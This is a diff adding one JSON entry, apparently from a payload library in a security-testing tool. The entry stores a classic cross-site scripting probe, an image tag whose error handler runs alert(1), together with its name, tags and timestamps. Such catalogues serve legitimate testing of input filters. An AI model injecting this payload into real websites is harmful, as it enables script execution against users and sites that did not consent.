@@ -1,0 +1,14 @@
+{
+  "id": "payload-1770491012549-1hpydi7mq",
+  "name": "IMG Tag XSS",
+  "category": "xss",
+  "payload": "<img src=x onerror=alert(1)>",
+  "description": "XSS via image error handler",
+  "tags": [
+    "img",
+    "event"
+  ],
+  "usageCount": 0,
+  "createdAt": "2026-02-07T19:03:32.549Z",
+  "updatedAt": "2026-02-07T19:03:32.549Z"
+}
